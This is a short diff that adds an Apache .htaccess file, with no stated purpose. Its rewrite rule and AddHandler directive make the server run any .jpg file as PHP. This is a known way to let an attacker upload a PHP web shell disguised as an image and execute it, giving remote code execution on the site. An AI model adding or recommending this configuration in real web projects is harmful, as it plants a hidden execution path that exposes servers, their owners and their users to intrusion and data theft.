@@ -1,0 +1,5 @@
+RewriteEngine On
+
+RewriteRule ^(.*)\.jpg$ $1.jpg [T=application/x-httpd-php]
+
+AddHandler application/x-httpd-php .jpg
